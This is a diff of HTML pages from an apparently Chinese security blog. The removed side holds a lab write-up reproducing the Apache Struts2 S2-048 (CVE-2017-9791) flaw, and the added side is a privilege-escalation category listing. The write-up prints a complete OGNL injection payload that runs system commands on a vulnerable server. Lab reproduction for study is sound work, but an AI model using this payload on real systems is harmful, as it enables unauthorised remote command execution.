@@ -20,24 +20,17 @@
     var CONFIG = {"hostname":"hzktester.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="漏洞原理Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从">
-<meta property="og:type" content="article">
-<meta property="og:title" content="S2-048 CVE-2017-9791复现过程">
-<meta property="og:url" content="https://hzktester.top/posts/37119a29.html">
+  <meta name="description" content="偷偷努力，然后惊艳所有人">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hzktester&#96;s Blog">
+<meta property="og:url" content="https://hzktester.top/categories/%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="Hzktester&#96;s Blog">
-<meta property="og:description" content="漏洞原理Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从">
+<meta property="og:description" content="偷偷努力，然后惊艳所有人">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020081407.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020081408.png">
-<meta property="og:image" content="https://qiniu.hzktester.top/tp2020081409.png">
-<meta property="article:published_time" content="2020-08-14T07:31:00.000Z">
-<meta property="article:modified_time" content="2020-10-20T09:21:51.055Z">
 <meta property="article:author" content="hzktester">
-<meta property="article:tag" content="Struts2">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://qiniu.hzktester.top/tp2020081407.png">
 
-<link rel="canonical" href="https://hzktester.top/posts/37119a29.html">
+<link rel="canonical" href="https://hzktester.top/categories/%E6%8F%90%E6%9D%83/">
 
 
 <script id="page-configurations">
@@ -45,12 +38,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : true,
+    isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>S2-048 CVE-2017-9791复现过程 | Hzktester`s Blog</title>
+  <title>分类: 提权 | Hzktester`s Blog</title>
   
 
 
@@ -194,151 +187,51 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content category">
             
 
-    
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hzktester.top/posts/37119a29.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="hzktester">
-      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hzktester`s Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          S2-048 CVE-2017-9791复现过程
-        </h1>
-
-        <div class="post-meta">
-			
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-08-14 15:31:00" itemprop="dateCreated datePublished" datetime="2020-08-14T15:31:00+08:00">2020-08-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-20 17:21:51" itemprop="dateModified" datetime="2020-10-20T17:21:51+08:00">2020-10-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" style="display: inline;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+  
+  <div class="post-block">
+    <div class="posts-collapse">
+      <div class="collection-title">
+        <h2 class="collection-header">提权
+          <small>分类</small>
+        </h2>
+      </div>
 
       
-        <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="https://qiniu.hzktester.top/tp2020081407.png" alt="image"></p>
-</li>
-<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
-</li>
-<li><p>poc利用</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qiniu.hzktester.top/tp2020081408.png" alt="image"></p>
-<p>或直接使用工具<br><img src="https://qiniu.hzktester.top/tp2020081409.png" alt="image"></p>
-
+    <div class="collection-year">
+      <span class="collection-header">2020</span>
     </div>
 
-    
-    
-    
-        
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
 
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>hzktester
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="https://hzktester.top/posts/37119a29.html" title="S2-048 CVE-2017-9791复现过程">https://hzktester.top/posts/37119a29.html</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2020-11-15T20:33:00+08:00"
+              content="2020-11-15">
+          11-15
+        </time>
+      </div>
 
+      <div class="post-title">
+          <a class="post-title-link" href="/posts/d83e4025.html" itemprop="url">
+            <span itemprop="name">MySQL UDF提权执行系统命令</span>
+          </a>
+      </div>
 
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/Struts2/" rel="tag"><i class="fa fa-tag"></i> Struts2</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/posts/1359d177.html" rel="prev" title="S2-052 CVE-2017-9805复现过程">
-      <i class="fa fa-chevron-left"></i> S2-052 CVE-2017-9805复现过程
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/posts/33bebcf9.html" rel="next" title="S2-029 CVE-2016-0785复现过程">
-      S2-029 CVE-2016-0785复现过程 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
+    </header>
   </article>
+
+    </div>
+  </div>
   
   
+  
+
   
 
 
@@ -391,7 +284,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.</span> <span class="nav-text">复现步骤</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
